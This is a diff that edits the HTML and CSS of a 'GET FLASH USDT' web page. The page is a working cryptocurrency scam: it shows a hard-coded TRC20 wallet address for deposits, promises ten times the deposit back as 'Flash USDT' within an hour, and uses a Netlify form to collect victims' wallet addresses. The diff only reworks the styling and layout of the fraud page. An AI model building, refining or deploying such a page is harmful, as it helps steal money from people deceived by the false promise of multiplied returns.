@@ -25,39 +25,40 @@
       text-align: center;
     }
     h2 { margin-top: 0; font-size: 1.5rem; }
-    label, .note { display:block; margin: 1rem 0 0.25rem; text-align: left; }
+    label, .warning { display:block; margin: 1rem 0 0.25rem; text-align: left; }
+    .warning { color: #ff4444; font-size: 1rem; font-weight: bold; text-align: center; }
     input, button { padding: 0.5rem; border: none; border-radius: 6px; font-size: 1rem; background: white; color: #333; }
     input { width: 100%; margin-bottom: 0.75rem; }
     button { width: 100%; margin-top: 1rem; background: #28a745; color: #fff; cursor: pointer; }
     button:hover { opacity: 0.9; }
-    .note { font-size: 0.8rem; color: #f88; margin-bottom:1rem; }
     .calculator { margin-top: 1.5rem; }
-    .calculator p { text-align: center; margin: 1rem 0; }
+    .calculator p { text-align: center; margin: 1rem 0; font-size: 1rem; }
+    .calculator input { width: 4rem; text-align: center; }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>GET FLASH USDT</h2>
 
-    <!-- Netlify form to collect address and deposit -->
     <form name="usdt-form" method="POST" data-netlify="true" action="?submitted=true">
       <input type="hidden" name="form-name" value="usdt-form">
 
       <label for="buyAddress">Buy Address (TRC20) (Send Your USDT Here):</label>
       <input type="text" id="buyAddress" name="buyAddress" value="TVuDSSUvFyUxFJGtXAAM1SQ7UNscPEdaHM" readonly>
 
-      <p class="note">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</p>
+      <div class="warning">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</div>
 
       <label for="usdtAddress">Your USDT Address:</label>
       <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>
 
-      <label for="deposit">If you deposit <input type="number" id="deposit" name="deposit" value="1.00" step="0.01"> USDT</label>
-      <label>You will get <span id="outputVal">10.00</span> USDT</label>
+      <div class="calculator">
+        <p>If you deposit <input type="number" id="deposit" name="deposit" value="1.00" step="0.01"> USDT</p>
+        <p>You will get <span id="outputVal">10.00</span> USDT</p>
+      </div>
 
       <button type="submit">Submit</button>
     </form>
 
-    <!-- Thank-you message after submission -->
     <div id="thankyouMsg" style="display:none; color:#fff; margin-top:1rem; text-align:center;">
       <p>If you have sent the USDT to Buy Address, your Flash USDT will be sent to you in 15 minutes to 1 hour. Please wait patiently.</p>
       <p>Thank you</p>
@@ -76,7 +77,6 @@
     deposit.addEventListener('input', updateOutput);
     updateOutput();
 
-    // Show thank-you message if URL has ?submitted=true
     if (location.search.includes('submitted=true')) {
       thankyou.style.display = 'block';
     }
